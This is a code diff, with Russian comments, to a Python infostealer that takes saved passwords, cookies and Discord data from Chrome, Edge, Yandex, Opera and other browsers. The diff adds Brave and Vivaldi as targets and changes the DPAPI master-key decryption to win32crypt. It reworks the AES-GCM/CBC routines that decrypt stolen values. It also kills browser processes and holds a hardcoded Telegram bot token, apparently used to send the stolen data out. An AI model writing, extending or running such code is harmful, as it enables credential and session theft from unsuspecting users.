@@ -23,6 +23,7 @@ import sys
 import traceback
 from pathlib import Path
 from Cryptodome.Cipher import AES
+import win32crypt  # Добавлена новая зависимость
 
 # =============================================
 # АВТОМАТИЧЕСКАЯ УСТАНОВКА ЗАВИСИМОСТЕЙ
@@ -34,7 +35,8 @@ def install_dependencies():
         'opencv-python',
         'pillow',
         'psutil',
-        'python-telegram-bot'
+        'python-telegram-bot',
+        'pypiwin32; platform_system == "Windows"'
     ]
     
     try:
@@ -53,51 +55,6 @@ def install_dependencies():
 
 # Вызываем установку зависимостей при первом запуске
 install_dependencies()
-
-# =============================================
-# РЕАЛИЗАЦИЯ CRYPTUNPROTECTDATA ЧЕРЕЗ CTYPES (ИСПРАВЛЕННАЯ)
-# =============================================
-class DATA_BLOB(ctypes.Structure):
-    _fields_ = [
-        ('cbData', ctypes.wintypes.DWORD),
-        ('pbData', ctypes.POINTER(ctypes.c_byte))
-    ]
-
-def crypt_unprotect_data(encrypted_data):
-    """Реализация CryptUnprotectData через ctypes"""
-    buffer = ctypes.create_string_buffer(encrypted_data)
-    blob_in = DATA_BLOB(ctypes.sizeof(buffer), ctypes.cast(ctypes.pointer(buffer), ctypes.POINTER(ctypes.c_byte)))
-    blob_out = DATA_BLOB()
-    
-    # Загружаем библиотеку crypt32.dll
-    crypt32 = ctypes.WinDLL('crypt32.dll')
-    crypt32.CryptUnprotectData.argtypes = [
-        ctypes.POINTER(DATA_BLOB),
-        ctypes.c_wchar_p,
-        ctypes.POINTER(DATA_BLOB),
-        ctypes.c_void_p,
-        ctypes.c_void_p,
-        ctypes.c_uint,
-        ctypes.POINTER(DATA_BLOB)
-    ]
-    crypt32.CryptUnprotectData.restype = ctypes.wintypes.BOOL
-    
-    # Загружаем kernel32.dll для LocalFree
-    kernel32 = ctypes.WinDLL('kernel32.dll')
-    kernel32.LocalFree.argtypes = [ctypes.c_void_p]
-    kernel32.LocalFree.restype = ctypes.c_void_p
-    
-    if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
-        decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-        # Используем kernel32.LocalFree вместо crypt32.LocalFree
-        kernel32.LocalFree(blob_out.pbData)
-        return decrypted_data
-    else:
-        error_code = ctypes.windll.kernel32.GetLastError()
-        # Игнорируем ошибку 13 (неверные данные)
-        if error_code != 13:
-            debug_log(f"CryptUnprotectData failed with error code {error_code}")
-        return None
 
 # Конфигурация Telegram
 TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
@@ -127,7 +84,9 @@ BROWSERS = {
     "yandex": "Yandex Browser",
     "opera": "Opera Browser",
     "amigo": "Amigo Browser",
-    "edge": "Microsoft Edge"
+    "edge": "Microsoft Edge",
+    "brave": "Brave Browser",
+    "vivaldi": "Vivaldi Browser"
 }
 
 # Глобальный логгер для отладки
@@ -143,8 +102,193 @@ def debug_log(message):
         print(f"Ошибка записи в лог: {e}")
 
 # =============================================
-# ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES
+# ФУНКЦИИ ДЛЯ РАБОТЫ С COOKIES (ИСПРАВЛЕННЫЕ)
 # =============================================
+
+def get_encryption_key(profile_path):
+    """Получает ключ шифрования с использованием win32crypt"""
+    debug_log(f"Поиск ключа для: {profile_path}")
+    
+    if platform.system() != "Windows":
+        debug_log("Платформа не Windows, ключ не может быть получен")
+        return None
+    
+    # Поиск Local State в возможных расположениях
+    possible_paths = [
+        Path(profile_path) / "Local State",
+        Path(profile_path).parent / "Local State",
+        Path(profile_path).parent.parent / "Local State",
+        Path(profile_path).parent.parent.parent / "Local State",
+        Path(profile_path).parent.parent.parent.parent / "Local State"
+    ]
+    
+    local_state_path = None
+    for path in possible_paths:
+        if path.exists():
+            local_state_path = path
+            debug_log(f"Найден Local State: {path}")
+            break
+    
+    if not local_state_path:
+        debug_log(f"Файл Local State не найден для: {profile_path}")
+        return None
+    
+    try:
+        with open(local_state_path, 'r', encoding='utf-8') as f:
+            local_state = json.loads(f.read())
+        
+        # Проверка наличия ключа os_crypt
+        if "os_crypt" not in local_state:
+            debug_log(f"Ключ 'os_crypt' не найден в {local_state_path}")
+            return None
+            
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        if len(encrypted_key) < 5:
+            debug_log(f"Некорректная длина ключа: {len(encrypted_key)} байт")
+            return None
+            
+        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
+        try:
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            debug_log(f"Ключ успешно получен ({len(key)} байт)")
+            return key
+        except Exception as e:
+            debug_log(f"Ошибка в CryptUnprotectData: {e}")
+            return None
+    except Exception as e:
+        debug_log(f"Ошибка получения ключа {profile_path}: {e}")
+        return None
+
+def decrypt_chromium_value(encrypted_value, key):
+    """Улучшенная расшифровка значений для Chromium"""
+    try:
+        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
+        
+        if not encrypted_value or not isinstance(encrypted_value, bytes):
+            return ""
+        
+        # Формат v10/v11 (AES-GCM)
+        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
+            debug_log("Обнаружен формат v10/v11 (AES-GCM)")
+            try:
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:-16] if encrypted_value.startswith(b'v10') else encrypted_value[15:-12]
+                tag = encrypted_value[-16:] if encrypted_value.startswith(b'v10') else None
+                
+                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+                if tag:
+                    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+                else:
+                    plaintext = cipher.decrypt(ciphertext)
+                
+                try:
+                    return plaintext.decode('utf-8')
+                except UnicodeDecodeError:
+                    return plaintext.decode('latin-1', errors='ignore')
+            except Exception as e:
+                debug_log(f"Ошибка GCM: {str(e)}")
+                return encrypted_value.hex()
+        
+        # Старый формат AES-CBC
+        elif len(encrypted_value) > 16:
+            debug_log("Попытка дешифровки CBC")
+            try:
+                iv = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:]
+                
+                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+                plaintext = cipher.decrypt(ciphertext)
+                
+                # Удаляем PKCS7 padding
+                padding_length = plaintext[-1]
+                plaintext = plaintext[:-padding_length]
+                
+                try:
+                    return plaintext.decode('utf-8')
+                except UnicodeDecodeError:
+                    return plaintext.decode('latin-1', errors='ignore')
+            except Exception as e:
+                debug_log(f"Ошибка CBC: {str(e)}")
+                return encrypted_value.hex()
+        
+        # Неизвестный формат
+        debug_log("Неизвестный формат, возвращаем как есть")
+        return encrypted_value.hex()
+            
+    except Exception as e:
+        debug_log(f"Критическая ошибка дешифровки: {traceback.format_exc()}")
+        return encrypted_value.hex()
+
+def steal_chromium_cookies(browser_name, profile_path):
+    """Крадет куки из браузеров на основе Chromium"""
+    try:
+        debug_log(f"Кража куки для {browser_name} из {profile_path}")
+        key = get_encryption_key(str(Path(profile_path).parent))
+        
+        if key:
+            debug_log(f"Получен ключ дешифровки ({len(key)} байт)")
+        else:
+            debug_log("Ключ дешифровки не найден")
+        
+        cookie_db = os.path.join(profile_path, "Network", "Cookies")
+        
+        if not os.path.exists(cookie_db):
+            debug_log(f"Файл куки не найден: {cookie_db}")
+            return []
+        
+        # Создаем временную копию файла куки
+        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
+        shutil.copy2(cookie_db, temp_db)
+        debug_log(f"Создана временная копия: {temp_db}")
+        
+        cookies = []
+        try:
+            conn = sqlite3.connect(temp_db)
+            conn.text_factory = bytes
+            cursor = conn.cursor()
+            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
+            
+            for i, item in enumerate(cursor.fetchall()):
+                try:
+                    host, name, value, path, expires, secure, encrypted_value = item
+                    debug_log(f"Обработка куки #{i+1}")
+                    
+                    # Приоритет - encrypted_value
+                    if encrypted_value and isinstance(encrypted_value, bytes):
+                        cookie_value = decrypt_chromium_value(encrypted_value, key)
+                    else:
+                        # Если нет encrypted_value, используем обычное значение
+                        if isinstance(value, bytes):
+                            cookie_value = value.decode('utf-8', errors='ignore')
+                        else:
+                            cookie_value = value
+                    
+                    cookies.append({
+                        'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
+                        'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
+                        'value': cookie_value,
+                        'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
+                        'expires': expires,
+                        'secure': bool(secure)
+                    })
+                except Exception as e:
+                    debug_log(f"Ошибка обработки куки: {traceback.format_exc()}")
+                    continue
+        except Exception as e:
+            debug_log(f"Ошибка SQL: {traceback.format_exc()}")
+        finally:
+            try:
+                conn.close()
+                os.remove(temp_db)
+                debug_log("Временный файл куки удален")
+            except:
+                pass
+        
+        debug_log(f"Найдено куки: {len(cookies)}")
+        return cookies
+    except Exception as e:
+        debug_log(f"Ошибка при краже куки {browser_name}: {traceback.format_exc()}")
+        return []
 
 def get_firefox_profiles():
     """Получает список профилей Firefox"""
@@ -162,7 +306,7 @@ def get_firefox_profiles():
     return profiles
 
 def get_firefox_cookies():
-    """Крадет куки из Firefox с обработкой зашифрованных значений"""
+    """Крадет куки из Firefox"""
     profiles = get_firefox_profiles()
     all_cookies = []
     
@@ -219,7 +363,7 @@ def get_firefox_cookies():
     return all_cookies
 
 # =============================================
-# ОСНОВНОЙ КОД С ИСПРАВЛЕННОЙ ДЕШИФРОВКОЙ
+# ОСНОВНЫЕ ФУНКЦИИ (ОСТАЛЬНЫЕ БЕЗ ИЗМЕНЕНИЙ)
 # =============================================
 
 def create_directories():
@@ -302,7 +446,9 @@ def stealthy_kill_browser(browser_name):
         "opera": "opera.exe",
         "yandex": "browser.exe",
         "amigo": "browser.exe",
-        "edge": "msedge.exe"
+        "edge": "msedge.exe",
+        "brave": "brave.exe",
+        "vivaldi": "vivaldi.exe"
     }
     
     target_process = process_map.get(browser_name)
@@ -491,186 +637,6 @@ def steal_discord_data():
         with open(discord_dir / "file_list.json", "w") as f:
             json.dump(stolen_data, f)
 
-def get_encryption_key(profile_path):
-    """Получает ключ шифрования с поиском Local State в родительской папке"""
-    debug_log(f"Поиск ключа для: {profile_path}")
-    
-    if platform.system() != "Windows":
-        debug_log("Платформа не Windows, ключ не может быть получен")
-        return None
-    
-    # Поиск Local State в возможных расположениях
-    possible_paths = [
-        Path(profile_path) / "Local State",
-        Path(profile_path).parent / "Local State",
-        Path(profile_path).parent.parent / "Local State",
-        Path(profile_path).parent.parent.parent / "Local State",
-        Path(profile_path).parent.parent.parent.parent / "Local State"  # Для Yandex
-    ]
-    
-    local_state_path = None
-    for path in possible_paths:
-        if path.exists():
-            local_state_path = path
-            debug_log(f"Найден Local State: {path}")
-            break
-    
-    if not local_state_path:
-        debug_log(f"Файл Local State не найден для: {profile_path}")
-        return None
-    
-    try:
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.loads(f.read())
-        
-        # Проверка наличия ключа os_crypt
-        if "os_crypt" not in local_state:
-            debug_log(f"Ключ 'os_crypt' не найден в {local_state_path}")
-            return None
-            
-        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        if len(encrypted_key) < 5:
-            debug_log(f"Некорректная длина ключа: {len(encrypted_key)} байт")
-            return None
-            
-        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
-        try:
-            key = crypt_unprotect_data(encrypted_key)
-            if key:
-                debug_log(f"Ключ успешно получен ({len(key)} байт)")
-                return key
-            else:
-                debug_log("Не удалось расшифровать ключ с помощью DPAPI")
-                return None
-        except Exception as e:
-            debug_log(f"Ошибка в crypt_unprotect_data: {e}")
-            return None
-    except Exception as e:
-        debug_log(f"Ошибка получения ключа {profile_path}: {e}")
-        return None
-
-def decrypt_chromium_value(encrypted_value, key):
-    """Улучшенная расшифровка значений для Chromium с расширенной диагностикой"""
-    try:
-        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
-        
-        # Если значение пустое
-        if not encrypted_value:
-            debug_log("Пустое значение")
-            return ""
-        
-        # Если это не байты
-        if not isinstance(encrypted_value, bytes):
-            debug_log("Не байтовое значение")
-            return encrypted_value
-        
-        # Для Windows: попробовать DPAPI
-        if platform.system() == "Windows":
-            try:
-                decrypted = crypt_unprotect_data(encrypted_value)
-                if decrypted:
-                    try:
-                        result = decrypted.decode('utf-8')
-                        debug_log("Успешная дешифровка через DPAPI")
-                        return result
-                    except UnicodeDecodeError:
-                        result = decrypted.decode('latin-1')
-                        debug_log("Успешная дешифровка через DPAPI (latin-1)")
-                        return result
-            except Exception as e:
-                debug_log(f"Ошибка DPAPI: {str(e)}")
-        
-        # Проверка наличия ключа
-        if not key:
-            debug_log("Ключ дешифровки отсутствует")
-            return base64.b64encode(encrypted_value).decode('utf-8')
-        
-        # Обработка AES-GCM (v10/v11) - КЛЮЧЕВОЕ ИСПРАВЛЕНИЕ
-        if len(encrypted_value) > 15 and encrypted_value.startswith(b'v10'):
-            debug_log("Обнаружен формат v10 (AES-GCM)")
-            try:
-                nonce = encrypted_value[3:15]
-                ciphertext = encrypted_value[15:-16]
-                tag = encrypted_value[-16:]
-                
-                debug_log(f"Данные GCM: nonce={nonce.hex()[:12]}... ciphertext={len(ciphertext)} tag={tag.hex()[:12]}...")
-                
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
-                
-                try:
-                    result = plaintext.decode('utf-8')
-                    debug_log("Успешная дешифровка GCM")
-                    return result
-                except UnicodeDecodeError:
-                    debug_log("Ошибка декодирования UTF-8 после GCM, используем raw bytes")
-                    # Возвращаем как есть, если не удается декодировать
-                    return plaintext.hex()
-            except Exception as e:
-                debug_log(f"Ошибка GCM: {str(e)}")
-                # Попробовать без тега для старых версий
-                try:
-                    nonce = encrypted_value[3:15]
-                    ciphertext = encrypted_value[15:]
-                    
-                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                    plaintext = cipher.decrypt(ciphertext)
-                    
-                    try:
-                        return plaintext.decode('utf-8')
-                    except:
-                        return plaintext.hex()
-                except Exception as e2:
-                    debug_log(f"Ошибка GCM без тега: {str(e2)}")
-        
-        # Обработка AES-CBC (старые версии)
-        if len(encrypted_value) > 16:
-            debug_log("Попытка дешифровки CBC")
-            try:
-                # Для CBC используем первые 16 байт как IV
-                iv = encrypted_value[:16]
-                ciphertext = encrypted_value[16:]
-                
-                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-                plaintext = cipher.decrypt(ciphertext)
-                
-                # Удаляем PKCS7 padding
-                padding_length = plaintext[-1]
-                plaintext = plaintext[:-padding_length]
-                
-                try:
-                    result = plaintext.decode('utf-8')
-                    debug_log("Успешная дешифровка CBC")
-                    return result
-                except UnicodeDecodeError:
-                    debug_log("Ошибка декодирования UTF-8 после CBC, используем raw bytes")
-                    return plaintext.hex()
-            except Exception as e:
-                debug_log(f"Ошибка CBC: {str(e)}")
-        
-        # Последняя попытка: DPAPI для Windows
-        if platform.system() == "Windows":
-            try:
-                decrypted = crypt_unprotect_data(encrypted_value)
-                if decrypted:
-                    try:
-                        return decrypted.decode('utf-8')
-                    except UnicodeDecodeError:
-                        return decrypted.decode('latin-1')
-            except:
-                pass
-        
-        # Если ничего не сработало, вернуть как hex
-        debug_log("Все методы дешифровки не сработали, возвращаем hex")
-        return encrypted_value.hex()
-            
-    except Exception as e:
-        debug_log(f"КРИТИЧЕСКАЯ ОШИБКА ДЕШИФРОВКИ: {traceback.format_exc()}")
-        try:
-            return encrypted_value.hex()
-        except:
-            return "DECRYPTION_ERROR"
-
 def steal_chrome_passwords(browser_name, profile_path):
     """Крадет пароли из браузеров на основе Chromium"""
     try:
@@ -705,11 +671,6 @@ def steal_chrome_passwords(browser_name, profile_path):
                     url, username, password_value = item
                     debug_log(f"Обработка пароля #{i+1}")
                     
-                    # Логирование для диагностики
-                    debug_log(f"URL: {url[:50] if isinstance(url, bytes) else url}")
-                    debug_log(f"Username: {username[:50] if isinstance(username, bytes) else username}")
-                    debug_log(f"Password value: {password_value[:20] if isinstance(password_value, bytes) else password_value}...")
-                    
                     decrypted_pass = decrypt_chromium_value(password_value, key)
                     
                     if decrypted_pass:
@@ -738,83 +699,6 @@ def steal_chrome_passwords(browser_name, profile_path):
         debug_log(f"Ошибка при краже паролей {browser_name}: {traceback.format_exc()}")
         return []
 
-def steal_chromium_cookies(browser_name, profile_path):
-    """Крадет куки из браузеров на основе Chromium с 100% расшифровкой"""
-    try:
-        debug_log(f"Кража куки для {browser_name} из {profile_path}")
-        key = get_encryption_key(str(Path(profile_path).parent))
-        
-        if key:
-            debug_log(f"Получен ключ дешифровки ({len(key)} байт)")
-        else:
-            debug_log("Ключ дешифровки не найден")
-        
-        cookie_db = os.path.join(profile_path, "Network", "Cookies")
-        
-        if not os.path.exists(cookie_db):
-            debug_log(f"Файл куки не найден: {cookie_db}")
-            return []
-        
-        # Создаем временную копию файла куки
-        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
-        shutil.copy2(cookie_db, temp_db)
-        debug_log(f"Создана временная копия: {temp_db}")
-        
-        cookies = []
-        try:
-            conn = sqlite3.connect(temp_db)
-            conn.text_factory = bytes
-            cursor = conn.cursor()
-            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
-            
-            for i, item in enumerate(cursor.fetchall()):
-                try:
-                    host, name, value, path, expires, secure, encrypted_value = item
-                    debug_log(f"Обработка куки #{i+1}")
-                    
-                    # Логирование для диагностики
-                    debug_log(f"Host: {host[:50] if isinstance(host, bytes) else host}")
-                    debug_log(f"Name: {name[:50] if isinstance(name, bytes) else name}")
-                    debug_log(f"Value: {value[:20] if isinstance(value, bytes) else value}...")
-                    debug_log(f"Encrypted: {encrypted_value[:20] if isinstance(encrypted_value, bytes) else encrypted_value}...")
-                    
-                    # Приоритет - encrypted_value
-                    if encrypted_value and isinstance(encrypted_value, bytes):
-                        cookie_value = decrypt_chromium_value(encrypted_value, key)
-                    else:
-                        # Если нет encrypted_value, используем обычное значение
-                        if isinstance(value, bytes):
-                            cookie_value = value.decode('utf-8', errors='ignore')
-                        else:
-                            cookie_value = value
-                    
-                    cookies.append({
-                        'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
-                        'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
-                        'value': cookie_value,
-                        'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
-                        'expires': expires,
-                        'secure': bool(secure)
-                    })
-                except Exception as e:
-                    debug_log(f"Ошибка обработки куки: {traceback.format_exc()}")
-                    continue
-        except Exception as e:
-            debug_log(f"Ошибка SQL: {traceback.format_exc()}")
-        finally:
-            try:
-                conn.close()
-                os.remove(temp_db)
-                debug_log("Временный файл куки удален")
-            except:
-                pass
-        
-        debug_log(f"Найдено куки: {len(cookies)}")
-        return cookies
-    except Exception as e:
-        debug_log(f"Ошибка при краже куки {browser_name}: {traceback.format_exc()}")
-        return []
-
 def steal_passwords():
     """Крадет пароли из всех доступных браузеров"""
     try:
@@ -833,7 +717,9 @@ def steal_passwords():
             "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
             "opera": roaming / "Opera Software" / "Opera Stable",
             "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
-            "amigo": appdata / "Amigo" / "User Data" / "Default"
+            "amigo": appdata / "Amigo" / "User Data" / "Default",
+            "brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
+            "vivaldi": appdata / "Vivaldi" / "User Data" / "Default"
         }
         
         for browser_name, display_name in BROWSERS.items():
@@ -883,7 +769,9 @@ def steal_cookies():
             "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
             "opera": roaming / "Opera Software" / "Opera Stable",
             "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
-            "amigo": appdata / "Amigo" / "User Data" / "Default"
+            "amigo": appdata / "Amigo" / "User Data" / "Default",
+            "brave": appdata / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default",
+            "vivaldi": appdata / "Vivaldi" / "User Data" / "Default"
         }
         
         for browser_name, display_name in BROWSERS.items():
